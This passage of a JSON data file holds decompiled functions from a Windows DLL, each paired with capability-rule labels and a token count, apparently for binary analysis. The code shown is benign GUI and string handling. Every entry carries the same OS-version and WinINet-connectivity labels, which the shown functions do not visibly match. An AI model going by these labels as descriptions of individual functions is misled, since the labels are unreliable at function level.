CONCAT71(Stack183, uStack184);\n    iVar10 = iVar7;\n    if ((uStack160 + 1 < 0x1000) || (iVar10 = *(iVar7 + -8),  (iVar7 - iVar10) - 8U < 0x20)) {\n        fcn.18008fb24(iVar10);\n        goto code_r0x00018005539f;\n    }\ncode_r0x0001800557c4:\n    fcn.1800b3528();\ncode_r0x0001800557ca:\n    fcn.1800b3528();\ncode_r0x0001800557d0:\n    fcn.1800b3528();\ncode_r0x0001800557d6:\n    fcn.1800b3528();\ncode_r0x0001800557dc:\n    fcn.1800b3528();\ncode_r0x0001800557e2:\n    fcn.1800b3528();\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 3120
    },
    "1800557f": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_20h\n\nvoid fcn.1800557f0(int64_t arg1)\n\n{\n    int64_t *piVar1;\n    code *pcVar2;\n    int64_t ****ppppiVar3;\n    int64_t arg1_00;\n    uint64_t uVar4;\n    int64_t **arg2;\n    uchar auStack152 [32];\n    ulong uStack120;\n    int64_t ****ppppiStack104;\n    uint uStack96;\n    uint uStack92;\n    int64_t *var_50h;\n    uint64_t uStack80;\n    int64_t **var_40h;\n    int64_t **ppiStack64;\n    int64_t var_30h;\n    uint64_t var_28h;\n    ulong var_20h;\n    ulong var_18h;\n    ulong var_10h;\n    ulong var_8h;\n    \n    uStack120 = 0xfffffffffffffffe;\n    var_28h = *0x180123080 ^ auStack152;\n    (**0x1800de7f0)(*(arg1 + 0x90), 0x14b, 0, 0);\n    if (*(arg1 + 0xc5) != '\\0') {\n        _var_40h = ZEXT816(0);\n        var_30h = 0;\n        var_50h = NULL;\n        uStack80 = 7;\n        ppppiStack104 = ppppiStack104 & 0xffffffffffff0000;\n        ppppiVar3 = &ppppiStack104;\n        fcn.180010d70(ppppiVar3, 0x1800f821c, 0);\n        fcn.180009c00(ppppiVar3, &var_40h, &ppppiStack104);\n        if (var_40h != ppiStack64) {\n            do {\n                var_50h = NULL;\n                uStack80 = 0;\n                piVar1 = var_40h[2];\n                arg2 = var_40h;\n                if (0x7 < var_40h[3]) {\n                    arg2 = *var_40h;\n                }\n                if (piVar1 < 0x8) {\n                    ppppiStack104 = *arg2;\n                    uStack96 = *(arg2 + 1);\n                    uStack92 = *(arg2 + 0xc);\n                    uStack80 = 7;\n                    ppppiVar3 = &ppppiStack104;\n                }\n                else {\n                    uVar4 = piVar1 | 7;\n                    if (0x7ffffffffffffffe < uVar4) {\n                        uVar4 = 0x7ffffffffffffffe;\n                    }\n                    ppppiStack104 = fcn.180011cf0(&ppppiStack104, uVar4 + 1);\n                    fcn.1800ade80(ppppiStack104, arg2, piVar1 * 2 + 2);\n                    ppppiVar3 = &ppppiStack104;\n                    uStack80 = uVar4;\n                    if (7 < uVar4) {\n                        ppppiVar3 = ppppiStack104;\n                    }\n                }\n                var_50h = piVar1;\n                (**0x1800de7f0)(*(arg1 + 0x90), 0x143, 0, ppppiVar3);\n                if (7 < uStack80) {\n                    ppppiVar3 = ppppiStack104;\n                    if (0xfff < uStack80 * 2 + 2) {\n                        ppppiVar3 = ppppiStack104[-1];\n                        if (0x1f < ppppiStack104 + (-8 - ppppiVar3)) {\n                            fcn.1800b3528(ppppiVar3, uStack80 * 2 + 0x29);\n                            goto code_r0x000180055a04;\n                        }\n                    }\n                    fcn.18008fb24(ppppiVar3);\n                }\n                var_40h = var_40h + 4;\n            } while (var_40h != ppiStack64);\n        }\n        if (var_40h != NULL) {\n            fcn.180013aa0(var_40h, ppiStack64);\n            arg1_00 = var_40h;\n            if ((0xfff < (var_30h - var_40h & 0xffffffffffffffe0U)) &&\n               (arg1_00 = *(var_40h + -8),  0x1f < (var_40h - arg1_00) - 8U)) {\ncode_r0x000180055a04:\n                fcn.1800b3528();\n                pcVar2 = swi(3);\n                (*pcVar2)();\n                return;\n            }\n            fcn.18008fb24(arg1_00);\n        }\n    }\n    fcn.18008fb00(var_28h ^ auStack152);\n    return;\n}\n",
        "token_count": 1152
    },
    "180055a1": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.180055a10(int64_t *arg1)\n\n{\n    code *pcVar1;\n    int64_t iVar2;\n    char cVar3;\n    int32_t iVar4;\n    ulong *puVar5;\n    ulong uVar6;\n    int64_t *noname_0;\n    uchar *puVar7;\n    int64_t iVar8;\n    ulong *arg3;\n    ushort *puVar9;\n    bool bVar10;\n    uchar auStack440 [32];\n    uchar *puStack408;\n    ulong uStack400;\n    uchar uStack392;\n    unkbyte7 Stack391;\n    ulong uStack376;\n    uint64_t uStack368;\n    uchar *puStack360;\n    uchar uStack352;\n    unkbyte7 Stack351;\n    ulong uStack336;\n    uint64_t uStack328;\n    ushort uStack320;\n    unkbyte6 Stack318;\n    ulong uStack304;\n    uint64_t uStack296;\n    uchar uStack288;\n    unkbyte7 Stack287;\n    uint uStack272;\n    uint uStack268;\n    uint uStack264;\n    uint uStack260;\n    uchar uStack256;\n    unkbyte7 Stack255;\n    ulong uStack240;\n    uint64_t uStack232;\n    ulong uStack224;\n    uchar auStack216 [32];\n    uchar auStack184 [128];\n    ulong uStack56;\n    uchar uStack48;\n    unkbyte7 Stack47;\n    int64_t iStack32;\n    uint64_t uStack24;\n    uint64_t uStack16;\n    \n    uStack224 = 0xfffffffffffffffe;\n    uStack16 = *0x180123080 ^ auStack440;\n    cVar3 = (**(*arg1 + 0x58))();\n    if (cVar3 == '\\0') goto code_r0x000180055ec9;\n    uStack56 = CONCAT44(uStack56._4_4_, 0xffffffff);\n    (**0x1800de7f0)(*0x18012a390, 0x7ec, 0, &uStack56);\n    if (uStack56 < 0) goto code_r0x000180055ec9;\n    iVar8 = *0x18012a398;\n    if (uStack56 != 0) {\n        iVar8 = *0x18012a3a0;\n    }\n    if (iVar8 == 0) goto code_r0x000180055ec9;\n    iStack32 = 0;\n    uStack24 = 0xf;\n    uStack48 = 0;\n    noname_0 = arg1;\n    fcn.1800602c0(arg1, &uStack48);\n    if (iStack32 == 0) {\n        uStack376 = 0;\n        uStack368 = 0xf;\n        uStack392 = 0;\n        puVar7 = &uStack392;\n        fcn.180011120(puVar7, 0x1800fc940, 0x12);\n        cVar3 = fcn.180007d40(puVar7, &uStack392);\n        if (cVar3 != '\\0') {\n            cVar3 = (**(*arg1 + 0x58))(arg1);\n            if (cVar3 != '\\0') {\n                cVar3 = fcn.18005ed20(arg1, iVar8, &uStack48);\n                if (cVar3 == '\\0') {\n                    fcn.18005ed20(arg1, iVar8, &uStack48);\n                }\n            }\n        }\n    }\n    else {\n        fcn.180004530(noname_0, &uStack48);\n    }\n    fcn.180055230(arg1);\n    bVar10 = iStack32 == 0;\n    if (!bVar10) {\n        puStack360 = &uStack352;\n        uStack336 = 0;\n        uStack328 = 0xf;\n        uStack352 = 0;\n        fcn.180011120(&uStack352, 0x1800f47c6, 0);\n        uStack56 = &uStack352;\n        uStack272 = *0x180101910;\n        uStack268 = *0x180101914;\n        uStack264 = *0x180101918;\n        uStack260 = *0x18010191c;\n        uStack288 = 0;\n        fcn.180011120(&uStack288, 0x1800f47c7, 0);\n        uStack376 = CONCAT44(*0x180101914, *0x180101910);\n        uStack368 = CONCAT44(*0x18010191c, *0x180101918);\n        uStack392 = 0;\n        fcn.180011120(&uStack392, \"FileLabel\", 9);\n        puVar7 = auStack216;\n        uStack400 = fcn.18000de50(puVar7, &uStack352);\n        puStack408 = &uStack288;\n        puVar5 = fcn.180004b90(puVar7, &uStack256, &uStack48, &uStack392);\n        uVar6 = fcn.1800687b0(auStack184);\n        arg3 = puVar5;\n        if (0xf < puVar5[3]) {\n            arg3 = *puVar5;\n        }\n        fcn.180069050(uVar6, &uStack320, arg3, puVar5[2] + arg3);\n        fcn.1800686c0(auStack184);\n        if (uStack232 < 0x10) {\ncode_r0x000180055ca1:\n            uStack240 = CONCAT44(*0x180101914, *0x180101910);\n            uStack232 = CONCAT44(*0x18010191c, *0x180101918);\n            uStack256 = 0;\n            if (0xf < uStack328) {\n                iVar2 = CONCAT71(Stack351, uStack352);\n                iVar8 = iVar2;\n                if ((0xfff < uStack328 + 1) && (iVar8 = *(iVar2 + -8),  0x1f < (iVar2 - iVar8) - 8U))\n                goto code_r0x000180055efd;\n                fcn.18008fb24(iVar8);\n            }\n            uStack336 = 0;\n            uStack328 = 0xf;\n            uStack352 = 0;\n            puVar9 = &uStack320;\n            if (7 < uStack296) {\n                puVar9 = CONCAT62(Stack318, uStack320);\n            }\n            iVar4 = (**0x1800de7f0)(arg1[0x11], 0x14c, 0xffffffffffffffff, puVar9);\n            iVar8 = arg1[0x11];\n            (**0x1800de7f0)(iVar8, 0x14e, iVar4, 0);\n            (**0x1800de5b8)(iVar8, 0, 0);\n            if (7 < uStack296) {\n                iVar2 = CONCAT62(Stack318, uStack320);\n                iVar8 = iVar2;\n                if (uStack296 * 2 + 2 < 0x1000) {\ncode_r0x000180055d90:\n                    fcn.18008fb24(iVar8);\n                    goto code_r0x000180055d95;\n                }\n                iVar8 = *(iVar2 + -8);\n                if ((iVar2 - iVar8) - 8U < 0x20) goto code_r0x000180055d90;\n                fcn.1800b3528(iVar8, uStack296 * 2 + 0x29);\ncode_r0x000180055f09:\n                fcn.1800b3528();\ncode_r0x000180055f0f:\n                fcn.1800b3528();\n                pcVar1 = swi(3);\n                (*pcVar1)();\n                return;\n            }\ncode_r0x000180055d95:\n            uStack304 = *0x180101900;\n            uStack296 = *0x180101908;\n            uStack320 = 0;\n            if (0xf < uStack368) {\n                iVar2 = CONCAT71(Stack391, uStack392);\n                iVar8 = iVar2;\n                if ((0xfff < uStack368 + 1) && (iVar8 = *(iVar2 + -8),  0x1f < (iVar2 - iVar8) - 8U))\n                goto code_r0x000180055f09;\n                fcn.18008fb24(iVar8);\n            }\n            uStack376 = CONCAT44(*0x180101914, *0x180101910);\n            uStack368 = CONCAT44(*0x18010191c, *0x180101918);\n            uStack392 = 0;\n            if (0xf < CONCAT44(uStack260, uStack264)) {\n                iVar2 = CONCAT71(Stack287, uStack288);\n                iVar8 = iVar2;\n                if ((0xfff < CONCAT44(uStack260, uStack264) + 1) &&\n                   (iVar8 = *(iVar2 + -8),  0x1f < (iVar2 - iVar8) - 8U)) goto code_r0x000180055f0f;\n                fcn.18008fb24(iVar8);\n            }\n            bVar10 = iStack32 == 0;\n            goto code_r0x000180055e3a;\n        }\n        iVar2 = CONCAT71(Stack255, uStack256);\n        iVar8 = iVar2;\n        if ((uStack232 + 1 < 0x1000) || (iVar8 = *(iVar2 + -8),  (iVar2 - iVar8) - 8U < 0x20)) {\n            fcn.18008fb24(iVar8);\n            goto code_r0x000180055ca1;\n        }\ncode_r0x000180055ef7:\n        fcn.1800b3528();\ncode_r0x000180055efd:\n        fcn.1800b3528();\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\ncode_r0x000180055e3a:\n    cVar3 = (**(*arg1 + 0x58))(arg1);\n    if (cVar3 != '\\0') {\n        *(arg1 + 199) = !bVar10;\n        uVar6 = (**0x1800de798)(arg1[3], 0x232d);\n        (**0x1800de5b8)(uVar6, 0, 1);\n        uVar6 = (**0x1800de798)(arg1[3], 0x232f);\n        (**0x1800de770)(uVar6, !bVar10);\n    }\n    if (uStack24 < 0x10) goto code_r0x000180055ec9;\n    iVar2 = CONCAT71(Stack47, uStack48);\n    iVar8 = iVar2;\n    if (0xfff < uStack24 + 1) {\n        iVar8 = *(iVar2 + -8);\n        if (0x1f < (iVar2 - iVar8) - 8U) {\n            fcn.1800b3528(iVar8, uStack24 + 0x28);\n            goto code_r0x000180055ef7;\n        }\n    }\n    fcn.18008fb24(iVar8);\ncode_r0x000180055ec9:\n    fcn.18008fb00(uStack16 ^ auStack440);\n    return;\n}\n",
        "token_count": 2572
    },
    "180055f2": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.180055f20(int64_t arg1)\n\n{\n    ulong uVar1;\n    code *pcVar2;\n    int64_t iVar3;\n    int32_t iVar4;\n    int64_t arg1_00;\n    ushort *puVar5;\n    uchar auStack88 [32];\n    ulong uStack56;\n    ushort uStack48;\n    unkbyte6 Stack46;\n    int64_t iStack32;\n    uint64_t uStack24;\n    uint64_t uStack16;\n    \n    uStack56 = 0xfffffffffffffffe;\n    uStack16 = *0x180123080 ^ auStack88;\n    iStack32 = 0;\n    uStack24 = 7;\n    uStack48 = 0;\n    fcn.180060420(arg1, &uStack48);\n    fcn.1800557f0(arg1);\n    if (iStack32 == 0) {\n        iVar4 = -1;\n    }\n    else {\n        puVar5 = &uStack48;\n        if (7 < uStack24) {\n            puVar5 = CONCAT62(Stack46, uStack48);\n        }\n        iVar4 = (**0x1800de7f0)(*(arg1 + 0x90), 0x14c, 0xffffffffffffffff, puVar5);\n    }\n    uVar1 = *(arg1 + 0x90);\n    (**0x1800de7f0)(uVar1, 0x14e, iVar4, 0);\n    (**0x1800de5b8)(uVar1, 0, 0);\n    if (7 < uStack24) {\n        iVar3 = CONCAT62(Stack46, uStack48);\n        arg1_00 = iVar3;\n        if (0xfff < uStack24 * 2 + 2) {\n            arg1_00 = *(iVar3 + -8);\n            if (0x1f < (iVar3 - arg1_00) - 8U) {\n                fcn.1800b3528(arg1_00, uStack24 * 2 + 0x29);\n                pcVar2 = swi(3);\n                (*pcVar2)();\n                return;\n            }\n        }\n        fcn.18008fb24(arg1_00);\n    }\n    fcn.18008fb00(uStack16 ^ auStack88);\n    return;\n}\n",
        "token_count": 519
    },
    "18005603": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.180056030(int64_t *arg1)\n\n{\n    char cVar1;\n    ulong uVar2;\n    char in_DL;\n    uchar uVar3;\n    uint uVar4;\n    uint8_t uVar5;\n    \n    cVar1 = (**(*arg1 + 0x58))();\n    if (cVar1 != '\\0') {\n        (**0x1800de770)(arg1[0x13], in_DL);\n        if ((in_DL == '\\0') || (*(arg1 + 0x17) < 0)) {\n            uVar5 = 0;\n        }\n        else {\n            uVar5 = 1;\n        }\n        uVar2 = (**0x1800de798)(arg1[3], 0x233f);\n        (**0x1800de770)(uVar2, uVar5);\n        uVar2 = (**0x1800de798)(arg1[3], 0x2340);\n        (**0x1800de770)(uVar2, uVar5);\n        uVar2 = (**0x1800de798)(arg1[3], 0x2365);\n        (**0x1800de770)(uVar2, uVar5);\n        uVar2 = (**0x1800de798)(arg1[3], 0x2366);\n        (**0x1800de770)(uVar2, uVar5);\n        if ((uVar5 == 0) || (*(arg1 + 0x18) < 0)) {\n            uVar3 = 0;\n        }\n        else {\n            uVar3 = 1;\n        }\n        *(arg1 + 0x19) = uVar3;\n        uVar2 = (**0x1800de798)(arg1[3], 0x2367);\n        (**0x1800de770)(uVar2, uVar3);\n        uVar3 = *(arg1 + 0x19);\n        uVar2 = (**0x1800de798)(arg1[3], 0x2369);\n        (**0x1800de770)(uVar2, uVar3);\n        uVar3 = *(arg1 + 0x19);\n        uVar2 = (**0x1800de798)(arg1[3], 0x236b);\n        (**0x1800de770)(uVar2, uVar3);\n        uVar3 = *(arg1 + 0x19);\n        uVar2 = (**0x1800de798)(arg1[3], 0x2370);\n        (**0x1800de770)(uVar2, uVar3);\n        uVar2 = (**0x1800de798)(arg1[3], 0x236c);\n        (**0x1800de5b8)(uVar2, 0, 1);\n        uVar2 = (**0x1800de798)(arg1[3], 0x2371);\n        (**0x1800de5b8)(uVar2, 0, 1);\n        uVar2 = (**0x1800de798)(arg1[3], 0x236a);\n        (**0x1800de5b8)(uVar2, 0, 1);\n        uVar2 = (**0x1800de798)(arg1[3], 0x236e);\n        (**0x1800de5b8)(uVar2, 0, 1);\n        uVar2 = (**0x1800de798)(arg1[3], 0x236d);\n        (**0x1800de5b8)(uVar2, 0, 1);\n        uVar2 = (**0x1800de798)(arg1[3], 0x236f);\n        (**0x1800de5b8)(uVar2, 0, 1);\n        uVar2 = (**0x1800de7f0)(*0x18012a390, 0x801, 0, 0);\n        cVar1 = (uVar5 ^ 1) * '\\x02';\n        (**0x1800de6d0)(uVar2, *0x18012a8b8, cVar1);\n        (**0x1800de6d0)(uVar2, *0x18012abb0, cVar1);\n        (**0x1800de6d0)(uVar2, *0x18012a950, cVar1);\n        (**0x1800de6d0)(uVar2, *0x18012a9e8, cVar1);\n        uVar4 = 2;\n        if (*(arg1 + 0x19) != '\\0') {\n            uVar4 = 0;\n        }\n        (**0x1800de6d0)(uVar2, *0x18012aa80, uVar4);\n        (**0x1800de6d0)(uVar2, *0x18012ab18, uVar4);\n    }\n    return;\n}\n",
        "token_count": 1107
    },
    "1800562f": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.1800562f0(int64_t *arg1, int64_t **arg2, ulong noname_2, ulong noname_3, ulong noname_4, ulong noname_5, \n                  ulong noname_6, ulong noname_7, ulong noname_8, ulong noname_9, ulong noname_10, ulong noname_11, \n                  ulong noname_12, ulong noname_13, ulong noname_14, ulong noname_15, ulong noname_16, ulong noname_17, \n                  ulong noname_18, ulong noname_19, ulong noname_20, ulong noname_21, ulong noname_22, ulong noname_23, \n                  ulong noname_24, ulong noname_25, ulong noname_26, ulong noname_27, ulong noname_28, ulong noname_29, \n                  ulong noname_30, ulong noname_31, ulong noname_32, ulong noname_33, ulong noname_34, ulong noname_35, \n                  ulong arg_130h)\n\n{\n    int64_t **ppiVar1;\n    uint8_t **ppuVar2;\n    uint64_t arg1_00;\n    code *pcVar3;\n    int64_t iVar4;\n    bool bVar5;\n    bool bVar6;\n    char cVar7;\n    int32_t iVar8;\n    uint32_t uVar9;\n    ulong uVar10;\n    uint32_t *puVar11;\n    uint8_t **ppuVar12;\n    int64_t iVar13;\n    uint64_t uVar14;\n    int64_t *piVar15;\n    ulong *puVar16;\n    int64_t *arg1_01;\n    uint64_t uVar17;\n    int64_t iVar18;\n    uchar *arg1_02;\n    int64_t **arg2_00;\n    uchar *puVar19;\n    uint32_t uVar20;\n    uint64_t uVar21;\n    ulong *puVar22;\n    ulong var_70h;\n    ulong var_78h;\n    ulong var_80h;\n    ulong var_90h;\n    ulong var_98h;\n    ulong var_a0h;\n    ulong var_b0h;\n    ulong var_b8h;\n    ulong var_c0h;\n    uchar auStackY520 [32];\n    ulong in_stack_fffffffffffffe18;\n    ulong in_stack_fffffffffffffe20;\n    uint64_t in_stack_fffffffffffffe30;\n    uint in_stack_fffffffffffffe38;\n    uint in_stack_fffffffffffffe3c;\n    ulong in_stack_fffffffffffffe40;\n    uchar *in_stack_fffffffffffffe48;\n    uint32_t uVar23;\n    uint in_stack_fffffffffffffe54;\n    ushort in_stack_fffffffffffffe58;\n    unkbyte6 in_stack_fffffffffffffe5a;\n    ulong in_stack_fffffffffffffe60;\n    ulong in_stack_fffffffffffffe68;\n    uchar *in_stack_fffffffffffffe70;\n    uchar in_stack_fffffffffffffe78;\n    unkbyte7 in_stack_fffffffffffffe79;\n    ulong in_stack_fffffffffffffe80;\n    ulong in_stack_fffffffffffffe88;\n    ulong in_stack_fffffffffffffe90;\n    int64_t in_stack_fffffffffffffe98;\n    ulong in_stack_fffffffffffffea0;\n    ulong in_stack_fffffffffffffea8;\n    uint64_t in_stack_fffffffffffffeb0;\n    ulong uVar24;\n    ulong in_stack_fffffffffffffec0;\n    ulong in_stack_fffffffffffffec8;\n    ulong in_stack_fffffffffffffed0;\n    ulong in_stack_fffffffffffffed8;\n    ulong in_stack_fffffffffffffee0;\n    ulong in_stack_fffffffffffffee8;\n    ulong in_stack_fffffffffffffef0;\n    ulong in_stack_fffffffffffffef8;\n    ulong in_stack_ffffffffffffff00;\n    ulong in_stack_ffffffffffffff08;\n    ulong uStack152;\n    int64_t **ppiStack144;\n    ulong var_80h_2;\n    uint32_t uStack128;\n    uint32_t uStack124;\n    uint64_t var_70h_2;\n    uint64_t var_68h;\n    ulong var_60h;\n    int64_t iStack88;\n    uint64_t var_bp_48h;\n    uint64_t var_40h;\n    ulong var_bp_38h;\n    ulong var_10h;\n    \n    uVar24 = 0xfffffffffffffffe;\n    var_40h = *0x180123080 ^ auStackY520;\n    uStack152 = CONCAT44(uStack152._4_4_, 0xffffffff);\n    ppiStack144 = arg2;\n    (**0x1800de7f0)(*0x18012a390, 0x7ec, 0, &uStack152);\n    if (uStack152 < 0) {\ncode_r0x000180056490:\n        if (arg2[3] < 0x10) {\ncode_r0x0001800564ca:\n            *arg2 = 0;\n            arg2[3] = 0xf;\n            arg2[2] = NULL;\n            fcn.18008fb00(var_40h ^ auStackY520);\n            return;\n        }\n        piVar15 = *arg2;\n        arg1_01 = piVar15;\n        if ((arg2[3] + 1U < 0x1000) || (arg1_01 = piVar15[-1],  piVar15 + (-8 - arg1_01) < 0x20)) {\n            fcn.18008fb24(arg1_01);\n            goto code_r0x0001800564ca;\n        }\ncode_r0x000180056b0a:\n        fcn.1800b3528();\ncode_r0x000180056b10:\n        fcn.1800b3528();\ncode_r0x000180056b16:\n        fcn.1800b3528();\n    }\n    else {\n        iVar13 = *0x18012a398;\n        if (uStack152 != 0) {\n            iVar13 = *0x18012a3a0;\n        }\n        if (iVar13 == 0) goto code_r0x000180056490;\n        if (noname_2 != '\\0') {\n            piVar15 = arg1;\n            fcn.1800602c0(arg1, arg2);\n            fcn.180004530(piVar15, arg2);\n        }\n        if (arg2[2] == NULL) {\n            if (noname_3 == '\\0') {\n                iVar8 = (**0x1800de7f0)(arg1[0x11], 0x147, 0, 0);\n                if ((0 < iVar8) && (arg2_00 = arg1[0x1e] + -0x40 + iVar8 * 0x40,  arg2 != arg2_00)) {\n                    ppiVar1 = arg2_00 + 2;\n                    if (0xf < arg2_00[3]) {\n                        arg2_00 = *arg2_00;\n                    }\n                    fcn.180011120(arg2, arg2_00, *ppiVar1);\n                }\n            }\n            else {\n                var_70h_2 = 0;\n                var_68h = 0xf;\n                var_80h_2._0_4_ = var_80h_2 & 0xffffff00;\n                puVar16 = &var_80h_2;\n                fcn.180011120(puVar16, 0x1800fc968, 0x12);\n                cVar7 = fcn.180007d40(puVar16, &var_80h_2);\n                if (((cVar7 != '\\0') && (cVar7 = (**(*arg1 + 0x58))(arg1),  cVar7 != '\\0')) &&\n                   (cVar7 = fcn.18005ed20(arg1, iVar13, arg2),  cVar7 == '\\0')) {\n                    fcn.18005ed20(arg1, iVar13, arg2);\n                }\n            }\n            if (arg2[2] == NULL) {\n                fcn.180057fb0(arg1);\n                goto code_r0x000180056490;\n            }\n        }\n        uVar10 = (**0x1800de798)(arg1[3], 0x235e);\n        iVar8 = (**0x1800de708)(uVar10);\n        if (iVar8 != 0) {\n            uVar10 = fcn.18000de50(&stack0xfffffffffffffe98, arg2);\n            fcn.180061060(arg1, uVar10);\n        }\n        iStack88 = 0;\n        var_bp_48h = 7;\n        var_60h._0_2_ = 0;\n        if (arg2[2] < 0x2) {\n            fcn.180055a10(arg1);\n            fcn.180055f20(arg1);\n            if (var_bp_48h < 8) {\ncode_r0x000180056a92:\n                iStack88 = 0;\n                var_bp_48h = 7;\n                var_60h._0_2_ = 0;\n                goto code_r0x000180056490;\n            }\n            iVar18 = CONCAT62(var_60h._2_6_, var_60h);\n            iVar13 = iVar18;\n            if ((var_bp_48h * 2 + 2 < 0x1000) || (iVar13 = *(iVar18 + -8),  (iVar18 - iVar13) - 8U < 0x20)) {\ncode_r0x000180056a8d:\n                fcn.18008fb24(iVar13);\n                goto code_r0x000180056a92;\n            }\ncode_r0x000180056b04:\n            fcn.1800b3528();\n            goto code_r0x000180056b0a;\n        }\n        fcn.180060420(arg1, &var_60h);\n        fcn.180057fb0(arg1);\n        uVar10 = fcn.18000de50(&stack0xfffffffffffffe98, arg2);\n        fcn.1800608d0(arg1, uVar10);\n        if (noname_4 != '\\0') {\n            fcn.180055a10(arg1);\n        }\n        puVar16 = &var_80h_2;\n        if (iStack88 == 0) {\n            puVar11 = fcn.18000de50(&stack0xfffffffffffffe58, arg2);\n            uVar9 = 1;\n        }\n        else {\n            in_stack_fffffffffffffe40 = CONCAT44(*0x180101914, *0x180101910);\n            in_stack_fffffffffffffe48 = CONCAT44(*0x18010191c, *0x180101918);\n            in_stack_fffffffffffffe30 = in_stack_fffffffffffffe30 & 0xffffffffffffff00;\n            fcn.180011120(&stack0xfffffffffffffe30, 0x1800f47d3, 0);\n            puVar11 = &stack0xfffffffffffffe30;\n            uVar9 = 2;\n        }\n        var_70h_2 = 0;\n        var_68h = 0;\n        var_80h_2._0_4_ = *puVar11;\n        var_80h_2._4_4_ = puVar11[1];\n        uStack128 = puVar11[2];\n        uStack124 = puVar11[3];\n        var_70h_2 = *(puVar11 + 4);\n        var_68h = *(puVar11 + 6);\n        *(puVar11 + 4) = 0;\n        *(puVar11 + 6) = 0xf;\n        *puVar11 = 0;\n        uVar10 = fcn.1800687b0(&stack0xfffffffffffffee8);\n        puVar22 = &var_60h;\n        if (7 < var_bp_48h) {\n            puVar22 = CONCAT62(var_60h._2_6_, var_60h);\n        }\n        iVar13 = puVar22 + iStack88 * 2;\n        fcn.180068c50(uVar10, &stack0xfffffffffffffe78, puVar22, iVar13);\n        uVar20 = uVar9 | 0x18;\n        uVar23 = uVar20;\n        fcn.1800686c0(&stack0xfffffffffffffee8);\n        puVar22 = &var_80h_2;\n        puVar19 = &stack0xfffffffffffffe78;\n        fcn.1800609f0(arg1, puVar19, puVar22);\n        if (((uVar9 & 2) != 0) &&\n           (uVar20 = uVar9 & 0xfffffffd,  puVar19 = in_stack_fffffffffffffe48,  0xf < in_stack_fffffffffffffe48)) {\n            puVar19 = in_stack_fffffffffffffe48 + 1;\n            uVar17 = in_stack_fffffffffffffe30;\n            if (puVar19 < 0x1000) {\ncode_r0x0001800566cb:\n                fcn.18008fb24(uVar17);\n                goto code_r0x0001800566d1;\n            }\n            puVar19 = in_stack_fffffffffffffe48 + 0x28;\n            uVar17 = *(in_stack_fffffffffffffe30 - 8);\n            if ((in_stack_fffffffffffffe30 - uVar17) - 8 < 0x20) goto code_r0x0001800566cb;\n            goto code_r0x000180056b10;\n        }\ncode_r0x0001800566d1:\n        if (((uVar20 & 1) != 0) && (puVar19 = in_stack_fffffffffffffe70,  0xf < in_stack_fffffffffffffe70)) {\n            puVar19 = in_stack_fffffffffffffe70 + 1;\n            iVar4 = CONCAT62(in_stack_fffffffffffffe5a, in_stack_fffffffffffffe58);\n            iVar18 = iVar4;\n            if (puVar19 < 0x1000) {\ncode_r0x000180056711:\n                fcn.18008fb24(iVar18);\n                goto code_r0x000180056716;\n            }\n            puVar19 = in_stack_fffffffffffffe70 + 0x28;\n            iVar18 = *(iVar4 + -8);\n            if ((iVar4 - iVar18) - 8U < 0x20) goto code_r0x000180056711;\n            goto code_r0x000180056b16;\n        }\ncode_r0x000180056716:\n        bVar6 = false;\n        fcn.180055f20(arg1);\n        fcn.1800587e0(arg1);\n        fcn.1800590f0(arg1, puVar19, puVar22, iVar13, in_stack_fffffffffffffe18, in_stack_fffffffffffffe20, puVar16, \n                      in_stack_fffffffffffffe30, CONCAT44(in_stack_fffffffffffffe3c, in_stack_fffffffffffffe38), \n                      in_stack_fffffffffffffe40, in_stack_fffffffffffffe48, CONCAT44(in_stack_fffffffffffffe54, uVar23)\n                      , CONCAT62(in_stack_fffffffffffffe5a, in_stack_fffffffffffffe58), in_stack_fffffffffffffe60, \n                      in_stack_fffffffffffffe68, in_stack_fffffffffffffe70, \n                      CONCAT71(in_stack_fffffffffffffe79, in_stack_fffffffffffffe78), in_stack_fffffffffffffe80, \n                      in_stack_fffffffffffffe88, in_stack_fffffffffffffe90, in_stack_fffffffffffffe98, \n                      in_stack_fffffffffffffea0, in_stack_fffffffffffffea8, in_stack_fffffffffffffeb0, uVar24, \n                      in_stack_fffffffffffffec0, in_stack_fffffffffffffec8, in_stack_fffffffffffffed0, \n                      in_stack_fffffffffffffed8, in_stack_fffffffffffffee0, in_stack_fffffffffffffee8, \n                      in_stack_fffffffffffffef0, in_stack_fffffffffffffef8, in_stack_ffffffffffffff00, \n                      in_stack_ffffffffffffff08);\n        fcn.18005b920(arg1);\n        uVar24 = fcn.18000de50(&stack0xfffffffffffffec0, arg2);\n        fcn.1800614a0(arg1, &var_80h_2, uVar24);\n        uVar17 = var_70h_2;\n        puVar16 = CONCAT44(var_80h_2._4_4_, var_80h_2);\n        